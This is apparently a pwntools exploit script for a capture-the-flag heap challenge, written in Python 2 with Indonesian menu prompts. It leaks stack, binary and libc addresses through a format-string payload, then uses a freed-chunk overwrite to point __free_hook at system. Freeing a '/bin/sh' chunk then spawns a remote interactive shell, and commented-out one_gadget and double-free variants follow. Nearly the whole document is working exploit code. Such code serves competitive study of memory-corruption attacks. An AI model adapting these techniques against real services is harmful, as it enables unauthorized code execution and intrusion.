#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host dubwewsub.joints.id --port 22223 ./chal
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chal_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'dubwewsub.joints.id'
port = int(args.PORT or 22223)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

if args.LOCAL:
    libc = exe.libc
else:
    libc =ELF("./libc-2.27.so")

p = '%7$p-%8$p-%11$p'
io.sendlineafter("Anda: ",p)
data = (io.recvline()).split("-")
exe.address = int(data[0],16)-0xf66
stack = int(data[1],16)
if args.LOCAL:
    libc.address = int(data[2],16)-libc.sym["__libc_start_main"]-234 +3 
else:
    libc.address = int(data[2],16)-libc.sym["__libc_start_main"]-234 +3

print data
print "base exe ", hex(exe.address )
print "base libc ", hex(libc.address)
print "stack ", hex(stack)

def beli(idx,msg):
    io.sendlineafter("Anda: ","1")
    io.sendlineafter("berapa? ",str(idx))
    io.sendlineafter("ayam: ",str(msg))

def makan(idx):
    io.sendlineafter("Anda: ","4")
    io.sendlineafter("berapa? ",str(idx))

def ubah(idx,msg):
    io.sendlineafter("Anda: ","3")
    io.sendlineafter("berapa? ",str(idx))
    io.sendlineafter("ayam: ",str(msg))

for i in range(2):
    beli(i,"JUNK")

for i in range(2):
    makan(i)

malloc_hook=libc.sym["__malloc_hook"]
free_hook=libc.sym["__free_hook"]
system=libc.sym["system"]
print hex(free_hook)
ubah(1,p64(free_hook))

# beli(3,"JUNK")
beli(3,"/bin/sh\x00")
off=[0x4f2c5,0x4f322,0x10a38c]
off=[0xcbd1a,0xcbd1d,0xcbd20]
one_gadget=libc.address + off[2]
# beli(4,p64(one_gadget))
beli(4,p64(system))

# io.sendlineafter("Anda: ","1")
# io.sendlineafter("berapa? ","5")
io.sendlineafter("Anda: ","4")
io.sendlineafter("berapa? ","3")



# for i in range(7):
#     beli(i,"JUNK")
# beli(7,"JUNK")
# beli(8,"JUNK")
# # beli(9,"JUNK")
#
# for i in range(7):
#     makan(i)
#
# makan(7)
# makan(8)
# makan(7)
#
# for i in range(7):
#     beli(i+9,"JUNK")
#
# free_hook=libc.sym["__free_hook"]
# print hex(free_hook)
#
# beli(16,p64(free_hook))
# beli(17,p64(free_hook))
# beli(18,p64(free_hook))
#
# off=[0x4f2c5,0x4f322,0x10a38c]
# one_gadget=libc.address + off[0]
# print hex(one_gadget)
# beli(18,p64(malloc_hook))






io.interactive()
